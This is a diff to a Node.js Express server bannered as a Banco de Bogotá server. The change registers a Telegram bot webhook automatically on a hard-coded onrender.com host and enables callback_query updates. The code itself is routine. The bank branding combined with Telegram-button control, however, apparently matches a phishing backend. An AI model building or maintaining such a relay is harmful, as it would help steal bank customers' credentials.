@@ -603,7 +603,7 @@ app.get("/ping", (req, res) => {
   res.json({ ok: true, timestamp: new Date().toISOString() });
 });
 
-app.listen(PORT, () => {
+app.listen(PORT, async () => {
   console.log(`
 ╔═══════════════════════════════════════════╗
 ║   ✅ SERVIDOR BANCO DE BOGOTÁ ACTIVO      ║
@@ -613,23 +613,57 @@ app.listen(PORT, () => {
 ║   🔧 Callback data: CORREGIDO ✔          ║
 ╚═══════════════════════════════════════════╝
   `);
+
+  // Registrar webhook automáticamente
+  if (BOT_TOKEN) {
+    await registerWebhook('publish3-8iqt.onrender.com');
+  }
 });
 
 // Activar Webhook manualmente (GET) - AHORA USA EL TOKEN EN LA RUTA
+// Función para registrar webhook automáticamente
+async function registerWebhook(host) {
+  try {
+    const webhookUrl = `https://${host}/webhook/${BOT_TOKEN}`;
+    console.log(`🔗 Registrando webhook en: ${webhookUrl}`);
+
+    const response = await fetch(getTelegramApiUrl('setWebhook'), {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        url: webhookUrl,
+        allowed_updates: ["callback_query", "message"]
+      })
+    });
+
+    const data = await response.json();
+    if (data.ok) {
+      console.log(`✅ Webhook registrado exitosamente`);
+      console.log(`   URL: ${webhookUrl}`);
+    } else {
+      console.error(`❌ Error registrando webhook: ${data.description}`);
+    }
+    return data;
+  } catch (err) {
+    console.error(`❌ Error en registerWebhook:`, err.message);
+  }
+}
+
 app.get("/setWebhook", async (req, res) => {
   const webhookUrl = `https://${req.headers.host}/webhook/${BOT_TOKEN}`;
-  
+
   const response = await fetch(getTelegramApiUrl('setWebhook'), {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
-      url: webhookUrl
+      url: webhookUrl,
+      allowed_updates: ["callback_query", "message"]
     })
   });
 
   const data = await response.json();
-  res.json({ 
-    ...data, 
-    webhookUrl: webhookUrl 
+  res.json({
+    ...data,
+    webhookUrl: webhookUrl
   });
 });
